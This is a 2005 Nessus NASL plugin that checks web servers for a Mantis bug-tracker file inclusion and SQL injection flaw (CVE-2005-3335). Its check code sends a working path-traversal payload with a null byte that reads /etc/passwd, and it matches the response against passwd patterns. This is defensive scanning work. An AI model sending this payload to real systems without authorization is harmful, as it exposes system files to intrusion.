#
# This script was written by David Maciejak <david dot maciejak at kyxar dot fr>
# Ref:  Andreas Sandblad, Secunia Research
#
# This script is released under the GNU GPL v2

if(description)
{
  script_id(20093);
  script_cve_id("CVE-2005-3335");
  script_bugtraq_id(15210, 15212);
  script_version("$Revision: 1.2 $");
  
  script_name(english:"Mantis File Inclusion and SQL Injection Flaws");

 desc["english"] = "
Synopsis :

The remote web server contains a PHP application that is affected by
multiple flaws. 

Description :

The remote version of Mantis suffers from a remote file inclusion
vulnerability.  Provided PHP's 'register_globals' setting is enabled,
An attacker may be able to leverage this issue to read arbitrary files
on the local host or to execute arbitrary PHP code, possibly taken
from third-party hosts. 

In addition, the installed version reportedly may be prone to SQL
injection, cross-site scripting, and information disclosure attacks. 

See also :

http://secunia.com/secunia_research/2005-46/advisory/
http://sourceforge.net/mailarchive/forum.php?thread_id=8517463&forum_id=7369

Solution :

Upgrade to Mantis 0.19.3 or newer.

Risk factor :

Medium / CVSS Base Score : 6 
(AV:R/AC:H/Au:NR/C:P/A:P/I:P/B:N)"; 


  script_description(english:desc["english"]);
  script_summary(english:"Checks for flaws in Mantis < 0.19.3");
  script_category(ACT_GATHER_INFO);
  script_copyright(english:"This script is Copyright (C) 2005 David Maciejak");
  script_family(english:"CGI abuses");
  script_require_ports("Services/www", 80);
  script_dependencie("mantis_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  exit(0);
}

#the code

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);
if ( ! get_port_state(port))exit(0);
if ( ! can_host_php(port:port) ) exit(0);

# Test an install.
install = get_kb_item(string("www/", port, "/mantis"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches)) {
  dir = matches[2];

 req = http_get(item:string(dir, "/bug_sponsorship_list_view_inc.php?t_core_path=../../../../../../../../../../etc/passwd%00"), port:port);
 res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
 if(res == NULL) exit(0);
 if (
   egrep(pattern:"root:.*:0:[01]:", string:res) ||
   egrep(pattern:"Warning.+main\(/etc/passwd.+failed to open stream", string:res) ||
   egrep(pattern:"Failed opening .*'/etc/passwd", string:res)
 ) {
       security_warning(port);
       exit(0);
 }
}
